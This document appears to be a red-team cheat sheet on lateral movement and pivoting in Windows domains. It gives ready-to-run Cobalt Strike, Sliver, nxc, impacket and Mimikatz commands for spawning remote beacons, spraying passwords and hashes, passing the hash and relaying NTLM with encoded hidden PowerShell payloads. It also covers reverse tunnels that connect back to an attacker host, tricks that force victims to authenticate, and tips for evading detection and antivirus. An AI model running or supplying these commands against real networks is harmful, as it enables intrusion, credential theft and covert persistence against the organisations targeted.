## Lateral Movement & Pivoting

Moving between machines in the domain and tunnelling traffic through compromised hosts.

> For generic tunnel mechanics and syntax (SSH, Chisel, Ngrok, Proxychains), see [[Pentest/Cheat Sheets/Tunnelling]].

---

## Lateral Movement

### CS: jump

Spawns a Beacon payload on a remote target and connects to it automatically (P2P listeners).

```sh
beacon> jump [method] [target] [listener]

# Methods:
#   psexec / psexec64   — uploads service binary, runs as SYSTEM (4697 service events)
#   psexec_psh          — PowerShell one-liner, always x86
#   winrm / winrm64     — PowerShell via WinRM, runs as calling user (script block logs)
```

```sh
beacon> jump winrm64 <target> smb
beacon> jump psexec64 <target> smb
beacon> jump psexec_psh <target> smb
```

> [!Important]
> SMB Beacon is the best choice for lateral movement — SMB traffic blends into normal Windows environments.

---

### CS: remote-exec

Executes commands on a remote target. Does not spawn a Beacon automatically — requires manual payload management and `connect`/`link`.

```sh
beacon> remote-exec [method] [target] [command]

# Methods: psexec (SCM), winrm (PowerShell), wmi (process call create)
```

```sh
# Upload and execute via WMI
beacon> cd \\<target>\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi <target> C:\Windows\smb_x64.exe
beacon> link <target> <pipe_name>

# WinRM execution
beacon> remote-exec winrm <target> whoami
```

> [!Warning]
> **CoInitializeSecurity:** Beacon's WMI BOF calls `CoInitializeSecurity` which can only be set once per process. If it was set in another user's context, WMI will fail. Workaround: use `execute-assembly SharpWMI.exe`:
> ```sh
> beacon> execute-assembly C:\Tools\SharpWMI.exe action=exec computername=<target> command="C:\Windows\smb_x64.exe"
> ```

---

### DCOM

Uses `Invoke-DCOM` via `MMC20.Application` method. Parent process appears as `mmc.exe` or `svchost.exe -k DcomLaunch`.

```sh
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName <target> -Method MMC20.Application -Command C:\Windows\smb_x64.exe
```

---

### Seatbelt Remote Recon

Pre-jump enumeration — check target config before moving.

```sh
beacon> execute-assembly C:\Tools\Seatbelt.exe OSInfo -ComputerName=<target>
```

---

### Sliver: Lateral Movement

```sh
# psexec
psexec -d <SvcDisplayName> -s <SvcDescription> -p <profile> <target>
use <session_id>

# jump-psexec — upload exe and run via psexec
jump-psexec <target> <SvcName> /path/sliver.x64.exe //<target>/c$/file.exe

# jump-wmiexec — execute a command via WMI
jump-wmiexec <target> 'powershell -enc <BASE64_PAYLOAD>'

# impacket-wmiexec (from Linux via proxychains)
impacket-wmiexec ./<user>:'<password>'@<target>

# nxc exec methods
nxc smb <target> -d <domain> -u <user> -H <hash> --exec-method atexec -x 'powershell -enc <BASE64_PAYLOAD>'
nxc smb <target> -d <domain> -u <user> -H <hash> --exec-method smbexec -x 'powershell -enc <BASE64_PAYLOAD>'
```

---

### Password Spraying (Lateral Recon)

Test credentials or hashes across a subnet before moving laterally.

```sh
# Domain creds
nxc smb <subnet>/24 -d <domain> -u <user> -p <password>
nxc winrm <subnet>/24 -d <domain> -u <user> -H <hash>
nxc ssh <subnet>/24 -u <user>@<domain> -p <password>

# Local admin
nxc smb <subnet>/24 -d . -u Administrator -H <hash>

# Ticket spraying
nxc smb <subnet>/24 --use-kcache

# Share enumeration
nxc smb <subnet>/24 -d <domain> -u <user> -p <password> --shares

# Execute command on confirmed access
nxc smb <target> --use-kcache --exec-method atexec -x "powershell -enc <BASE64_PAYLOAD>"

# DB spray
mssqlpwner <domain>/<user>:<password>@<target> -windows-auth enumerate
mssqlpwner ./<user>@<target> -hashes ':<hash>' -windows-auth enumerate
```

---

## Pivoting

### SOCKS Proxy

Turn a Beacon into a SOCKS proxy to tunnel external tools into the internal network.

#### CS

```sh
# SOCKS4a
beacon> socks 1080

# SOCKS5 with auth
beacon> socks 1080 socks5 disableNoAuth <socks_user> <socks_password> enableLogging

# Verify on team server
attacker@ubuntu ~> sudo ss -lpnt
```

> [!Warning]
> The proxy binds on all interfaces — any device with network access to the team server can interact with it. SOCKS5 with auth provides additional protection.

#### Sliver

```sh
socks5 start
# Then verify /etc/proxychains4.conf: socks5 127.0.0.1 1081
```

---

### Proxychains (Linux)

Wraps tools to tunnel their traffic over SOCKS.

```sh
# Configure
sudo vim /etc/proxychains.conf
# SOCKS4: socks4 127.0.0.1 1080
# SOCKS5: socks5 127.0.0.1 1080 <user> <password>

# Use
proxychains <tool> <args>
proxychains nmap -n -Pn -sT -p445,3389,5985 <target>
sudo proxychains4 -q netexec smb <target>
```

> [!Warning]
> ICMP and SYN scans cannot be tunnelled. Use `-Pn -sT` for nmap.

---

### Proxifier (Windows)

GUI proxy tool for routing Windows tool traffic through SOCKS.

```
Profile > Proxy Servers > Add:  <teamserver_ip> : 1080 (SOCKS5)
Proxification Rules:
  Name: Tools | Applications: Any | Target hosts: <internal_ranges> | Action: Proxy SOCKS5 <ip>
```

To authenticate to domain resources via Proxifier:

```sh
# runas /netonly
runas /netonly /user:<DOMAIN>\<user> mmc.exe

# Mimikatz PTH
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:<DOMAIN> /user:<user> /ntlm:<hash> /run:mmc.exe
```

PowerShell credential objects also work for cmdlets that support `-Credential`.

---

### FoxyProxy (Browser)

Firefox + FoxyProxy extension — pivot a browser into internal web apps.

- Add a SOCKS5 proxy entry pointing to the team server
- Enable for specific URL patterns as needed
- [NTLM auth over FoxyProxy](https://offensivedefence.co.uk/posts/ntlm-auth-firefox/)

---

### Reverse Port Forwarding

Redirect inbound traffic on a compromised host to the team server. Useful when the target can't reach the team server directly.

#### CS

```sh
# Create firewall rule first (before binding)
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

# Start reverse port forward
beacon> rportfwd 8080 127.0.0.1 80

# Traffic hitting port 8080 on Beacon tunnels back to team server and is relayed to 127.0.0.1:80

# Cleanup
beacon> powershell Remove-NetFirewallRule -DisplayName "8080-In"
```

#### Sliver

```sh
# Reverse port forward: remote 7999 -> local 7999
rportfwd add -b 0.0.0.0:7999 -r 0.0.0.0:7999

# Port forward: local 33890 -> remote 10.10.100.30:3389
portfwd add -b 127.0.0.1:33890 -r 10.10.100.30:3389
```

---

### Ligolo-ng (Sliver — Full Subnet Routing)

More powerful than SOCKS + proxychains — provides real subnet routing.

```sh
# On Kali — start proxy
sudo /path/ligolo-ng/proxy -selfcert -laddr <attacker_ip>:4444

# Create interface and add routes
interface_create --name <name>
interface_route_add --name <name> --route 10.10.100.0/24

# Upload agent to target and connect back
upload /path/agent.exe c:/windows/tasks/agent.exe
execute C:\\Windows\\tasks\\agent.exe -connect <attacker_ip>:4444 -ignore-cert -retry

# Select tunnel and start
session
tunnel_start --tun <name>
```

---

### Chisel (TCP Tunnelling)

Fast TCP tunnel over HTTP. Useful when SOCKS is too slow or when you need a direct tunnel to a specific port.

#### Setup

```sh
# On attacker (server mode — reverse tunnel)
./chisel server --reverse --port 8080

# On target (client — connects back to attacker)
chisel.exe client <attacker_ip>:8080 R:socks
# Creates a SOCKS5 proxy on attacker:1080

# Specific port forward
chisel.exe client <attacker_ip>:8080 R:3389:<internal_target>:3389
# attacker:3389 → internal_target:3389
```

#### Common Patterns

```sh
# SOCKS proxy through Chisel
chisel.exe client <attacker>:8080 R:1080:socks
# Then use proxychains on attacker: socks5 127.0.0.1 1080

# Forward multiple ports
chisel.exe client <attacker>:8080 R:445:<target>:445 R:5985:<target>:5985

# Forward RDP
chisel.exe client <attacker>:8080 R:33389:<target>:3389
# Connect: xfreerdp /v:127.0.0.1:33389

# Chain through multiple hosts (multi-hop)
# Hop 1: DMZ → attacker
chisel.exe client <attacker>:8080 R:9001:socks
# Hop 2: Internal → DMZ
chisel.exe client <dmz_host>:9001 R:9002:socks
```

#### Via CS/Sliver

```sh
# Upload and execute
beacon> upload C:\Tools\chisel.exe
beacon> run chisel.exe client <teamserver>:8080 R:socks

# Sliver
upload /path/chisel.exe C:\\Windows\\Tasks\\chisel.exe
execute -o C:\\Windows\\Tasks\\chisel.exe client <attacker>:8080 R:socks
```

> **OPSEC:** Chisel traffic is HTTP/WebSocket — blends better than raw TCP tunnels. Use `--fingerprint` for TLS verification. The binary is commonly flagged by AV — obfuscate or use Go build flags to reduce signatures.

---

### SSH Tunnelling

When SSH access is available (Linux hosts, jump boxes).

```sh
# Local port forward: access internal service from attacker
ssh -L 8888:<internal_target>:80 user@<jumpbox>
# Browse http://127.0.0.1:8888 → hits internal_target:80

# Dynamic SOCKS proxy
ssh -D 1080 user@<jumpbox>
# Configure proxychains: socks5 127.0.0.1 1080

# Remote port forward: expose attacker port to internal network
ssh -R 8080:127.0.0.1:80 user@<jumpbox>
# jumpbox:8080 → attacker:80 (useful for payload delivery)

# Multi-hop SSH
ssh -J user@hop1,user@hop2 user@final_target

# Background tunnel (no shell)
ssh -f -N -D 1080 user@<jumpbox>
```

---

### NTLM Relaying

Intercept or capture NTLM authentication and relay it to another service. Port 445 is always bound on Windows — use PortBender to redirect traffic.

**Full chain (CS):**

```sh
# 1. Get SYSTEM beacon on capture machine

# 2. Add firewall rules
beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

# 3. Start reverse tunnels
beacon> rportfwd 8445 localhost 445
beacon> rportfwd 8080 localhost 80

# 4. Start SOCKS proxy for ntlmrelayx
beacon> socks 1080

# 5. Start ntlmrelayx on team server
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t smb://<target_ip> -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc <BASE64_PAYLOAD>'

# 6. Load PortBender driver and redirect 445 → 8445
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
# Load PortBender.cna via Cobalt Strike > Script Manager
beacon> PortBender redirect 445 8445

# 7. Stop PortBender after exploitation
beacon> jobs
beacon> jobkill <JID>
beacon> kill <PID>
```

> [!Warning]
> PortBender breaks legitimate SMB service on the machine while active. Primary detection indicator: WinDivert driver load event.

---

#### Forcing NTLM Authentication

When you need a target to authenticate to your capture machine:

**1x1 image in emails:**

```html
<img src="\\<capture_host>\test.ico" height="1" width="1" />
```

Modify the sender's email signature to trigger on every email they send.

**Windows shortcuts (UNC icon path):**

```powershell
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\<share>\software\test.lnk")
$shortcut.IconLocation = "\\<capture_host>\test.ico"
$shortcut.Save()
```

Browsing the share in Explorer triggers authentication (no click required).

**Remote auth triggers (RPC-based):**

```sh
# SpoolSample
beacon> execute-assembly C:\Tools\SpoolSample.exe <target_dc> <capture_host>

# SharpSpoolTrigger
beacon> execute-assembly C:\Tools\SharpSpoolTrigger.exe <target_dc> <capture_host>

# PetitPotam
python3 PetitPotam.py <capture_host> <target_dc>
```

---

> [!Note]
> **OPSEC summary:**
> - PsExec: 4697 service created events, random 7-char service/binary name
> - WinRM: child of `wsmprovhost.exe`, detectable via PowerShell script block logs
> - WMI: child of `WmiPrvSE.exe`
> - DCOM: child of `mmc.exe` or `svchost.exe -k DcomLaunch`
> - SMB Beacon blends best — SMB is ubiquitous in Windows environments
> - PortBender: WinDivert driver load is the main indicator
